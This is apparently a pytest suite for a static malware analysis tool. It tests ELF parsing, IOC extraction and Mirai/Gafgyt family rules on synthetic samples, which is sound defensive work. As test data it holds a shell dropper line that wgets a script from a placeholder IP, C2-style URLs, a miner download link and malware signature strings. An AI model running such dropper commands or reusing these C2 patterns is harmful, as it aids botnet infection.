"""Static analysis of captured payloads.

Synthetic samples throughout: the real corpus is live malware, and tests that
depend on it would rot the moment cleanup runs.
"""

import json
import struct

import pytest

from app.services.static_analysis import (
    analyze,
    analyze_path,
    extract_iocs,
    extract_strings,
    match_rules,
    parse_elf,
    to_columns,
)


def build_elf(bits=32, endian="little", machine=8, e_type=2, phoff=0, phnum=0,
              phentsize=32, tail=b"") -> bytes:
    """Construct a minimal, structurally valid ELF header."""
    e = "<" if endian == "little" else ">"
    ident = b"\x7fELF" + bytes([1 if bits == 32 else 2, 1 if endian == "little" else 2, 1])
    ident += b"\x00" * (16 - len(ident))
    if bits == 32:
        hdr = ident + struct.pack(
            f"{e}HHIIIIIHHHHHH", e_type, machine, 1, 0, phoff, 0, 0, 52,
            phentsize, phnum, 40, 0, 0)
    else:
        hdr = ident + struct.pack(
            f"{e}HHIQQQIHHHHHH", e_type, machine, 1, 0, phoff, 0, 0, 64,
            phentsize, phnum, 64, 0, 0)
    return hdr + tail


class TestElfParsing:
    def test_identifies_big_endian_mips_router_binary(self):
        elf = parse_elf(build_elf(bits=32, endian="big", machine=8))
        assert elf["bits"] == 32
        assert elf["endian"] == "big"
        assert elf["machine"] == "MIPS"

    @pytest.mark.parametrize("machine,name", [
        (3, "i386"), (8, "MIPS"), (40, "ARM"),
        (62, "x86-64"), (183, "AArch64"), (243, "RISC-V"),
    ])
    def test_names_the_architectures_this_corpus_contains(self, machine, name):
        assert parse_elf(build_elf(machine=machine))["machine"] == name

    def test_unknown_machine_is_reported_not_guessed(self):
        assert parse_elf(build_elf(machine=999))["machine"] == "unknown(999)"

    def test_non_elf_returns_none(self):
        assert parse_elf(b"#!/bin/sh\necho hi\n") is None
        assert parse_elf(b"") is None

    def test_truncated_elf_returns_none_rather_than_raising(self):
        assert parse_elf(b"\x7fELF\x01\x01\x01") is None

    def test_static_when_no_interp_segment(self):
        # e_phoff must point at the program headers, which follow the 52-byte
        # 32-bit header immediately.
        phdr = struct.pack("<I", 1) + b"\x00" * 28  # PT_LOAD
        elf = parse_elf(build_elf(phoff=52, phnum=1, tail=phdr))
        assert elf["static"] is True

    def test_dynamic_when_interp_segment_present(self):
        phdr = struct.pack("<I", 3) + b"\x00" * 28  # PT_INTERP
        elf = parse_elf(build_elf(phoff=52, phnum=1, tail=phdr))
        assert elf["static"] is False

    def test_interp_found_when_it_is_not_the_first_segment(self):
        phdrs = (struct.pack("<I", 1) + b"\x00" * 28
                 + struct.pack("<I", 3) + b"\x00" * 28)
        elf = parse_elf(build_elf(phoff=52, phnum=2, tail=phdrs))
        assert elf["static"] is False

    def test_unreadable_program_headers_give_unknown_not_static(self):
        """A truncated sample must not be reported as statically linked."""
        elf = parse_elf(build_elf(phoff=9999, phnum=4))
        assert elf["static"] is None


class TestStrings:
    def test_extracts_printable_runs_only(self):
        data = b"\x00\x01short\x00" + b"a_long_enough_string" + b"\xff\xfe"
        assert "a_long_enough_string" in extract_strings(data)

    def test_respects_the_cap(self):
        data = b"\x00".join([b"stringy_value"] * 50)
        assert len(extract_strings(data, limit=10)) == 10


class TestIocExtraction:
    def test_finds_embedded_c2_address_and_url(self):
        iocs = extract_iocs(["connect 185.244.25.171", "http://evil-c2.top/bins.sh"])
        assert "185.244.25.171" in iocs["ipv4"]
        assert "http://evil-c2.top/bins.sh" in iocs["urls"]

    @pytest.mark.parametrize("noise", ["127.0.0.1", "0.0.0.0", "255.255.255.255"])
    def test_drops_addresses_that_are_never_callbacks(self, noise):
        assert extract_iocs([f"bind {noise}"])["ipv4"] == []

    def test_drops_invalid_octets(self):
        assert extract_iocs(["version 999.1.1.1"])["ipv4"] == []

    @pytest.mark.parametrize("noise", [
        "libc.so.6", "GLIBC_2.2.5", "ld-linux-armhf.so.3", "golang.org/x/sys",
    ])
    def test_drops_toolchain_strings_that_look_like_domains(self, noise):
        assert extract_iocs([noise])["domains"] == []

    @pytest.mark.parametrize("symbol", [
        "time.DatH", "time.LocL", "net.IP", "os.File", "big.Int", "poll.FD",
        "fmt.pp", "url.URL", "ecdsa.zr", "exec.Cmd", "asn1.Tag", "sftp.fx",
    ])
    def test_drops_go_symbol_names(self, symbol):
        """Real false positives from a Go-built sample in the corpus.

        Stripped Go binaries are full of package-qualified symbols that are
        shaped exactly like domains, which is why acceptance is by real TLD
        rather than by rejecting known file extensions.
        """
        assert extract_iocs([symbol])["domains"] == []

    @pytest.mark.parametrize("symbol", [
        "errors.Is", "unicode.To", "reflect.flag.ro", "abi.Name",
        "atomic.Store", "syscall.Errno.Is", "runtime.name", "exec.in",
        "hash.net", "eq.io", "d.ng", "H.US", "0.lA", "C9U.Gg",
    ])
    def test_drops_go_symbols_that_end_in_real_cctlds(self, symbol):
        """Also from the real corpus: .is, .to, .ro and .name are all TLDs."""
        assert extract_iocs([symbol])["domains"] == []

    @pytest.mark.parametrize("real", [
        "minecraftpixelger39clone.dedyn.io", "api.ipify.org",
        "checkip.amazonaws.com", "discord.com", "ipinfo.io",
    ])
    def test_keeps_the_real_infrastructure_found_in_the_corpus(self, real):
        assert extract_iocs([real])["domains"] == [real]

    def test_drops_rfc1918_and_link_local(self):
        iocs = extract_iocs(["192.168.1.1", "169.254.0.0", "10.0.0.1"])
        assert iocs["ipv4"] == []

    def test_does_not_split_addresses_out_of_a_version_table(self):
        """Go version tables produced phantom C2 addresses before the fix."""
        assert extract_iocs(["1.5.4.32.5.4.52.5.4.72"])["ipv4"] == []

    def test_still_finds_an_address_adjacent_to_ordinary_text(self):
        assert extract_iocs(["connect=185.244.25.171:1312"])["ipv4"] == [
            "185.244.25.171"
        ]

    @pytest.mark.parametrize("bad", [
        "http://invalidlookup", "http://localhost", "https://runtime",
        "http://upx.sf.net", "https://go.dev/issue/66821",
    ])
    def test_drops_urls_with_no_real_host(self, bad):
        assert extract_iocs([bad])["urls"] == []

    def test_keeps_payload_url_on_a_shared_host(self):
        """github.com is noise as a bare domain but real as a payload URL."""
        url = ("https://github.com/HashVault/vltrig/releases/download/"
               "v6.25.0.4/vltrig-v6.25.0.4-linux-x64.tar.gz")
        assert extract_iocs([url])["urls"] == [url]

    def test_version_string_is_not_an_address(self):
        assert extract_iocs(["vltrig-v6.25.0.4-linux"])["ipv4"] == []

    def test_keeps_url_with_bare_ip_host(self):
        assert extract_iocs(["http://45.9.148.99/bins.sh"])["urls"] == [
            "http://45.9.148.99/bins.sh"
        ]

    def test_keeps_a_real_looking_c2_domain(self):
        assert "botnet-cnc.top" in extract_iocs(["botnet-cnc.top"])["domains"]

    def test_deduplicates_repeated_indicators(self):
        assert extract_iocs(["1.2.3.4", "1.2.3.4"] * 5)["ipv4"] == ["1.2.3.4"]


class TestFamilyRules:
    def test_attributes_mirai_from_its_busybox_banner(self):
        family, rules = match_rules(b"\x00\x00/bin/busybox MIRAI\x00")
        assert family == "mirai"
        assert "mirai.busybox_banner" in rules

    def test_attributes_gafgyt(self):
        family, _ = match_rules(b"....KILLATTK....")
        assert family == "gafgyt"

    def test_records_every_matching_rule_not_just_the_first(self):
        _, rules = match_rules(b"/bin/busybox MIRAI and /dev/watchdog")
        assert "mirai.busybox_banner" in rules
        assert "mirai.watchdog_kill" in rules

    def test_traits_are_recorded_without_claiming_a_family(self):
        family, rules = match_rules(b"Go build ID: abc")
        assert family is None
        assert "trait.go_binary" in rules

    def test_clean_file_attributes_nothing(self):
        family, rules = match_rules(b"just an ordinary file with text")
        assert family is None
        assert rules == []


class TestAnalyze:
    def test_end_to_end_on_a_mips_mirai_sample(self):
        data = build_elf(bits=32, endian="big", machine=8,
                         tail=b"/bin/busybox MIRAI\x00report to 45.9.148.99\x00")
        result = analyze(data)
        assert result["arch"] == "MIPS"
        assert result["family"] == "mirai"
        assert "45.9.148.99" in result["iocs"]["ipv4"]

    def test_shell_dropper_is_analyzed_without_elf_data(self):
        result = analyze(b"#!/bin/sh\nwget http://1.2.3.4/x.sh\n")
        assert result["elf"] is None
        assert result["arch"] is None
        assert "http://1.2.3.4/x.sh" in result["iocs"]["urls"]

    def test_missing_file_returns_none(self, tmp_path):
        assert analyze_path(tmp_path / "nope") is None

    def test_empty_file_returns_none(self, tmp_path):
        p = tmp_path / "empty"
        p.write_bytes(b"")
        assert analyze_path(p) is None


class TestToColumns:
    def test_maps_result_onto_columns_as_json(self):
        cols = to_columns(analyze(build_elf(machine=40, tail=b"KILLATTK")))
        assert cols["arch"] == "ARM"
        assert cols["malware_family"] == "gafgyt"
        assert "gafgyt.killattk" in json.loads(cols["yara_matches"])
        assert "ipv4" in json.loads(cols["static_iocs"])

    def test_unmatched_sample_still_records_an_empty_match_list(self):
        """The empty list is the marker that analysis ran; NULL means it did not."""
        cols = to_columns(analyze(b"harmless text file contents"))
        assert json.loads(cols["yara_matches"]) == []
        assert cols["malware_family"] is None
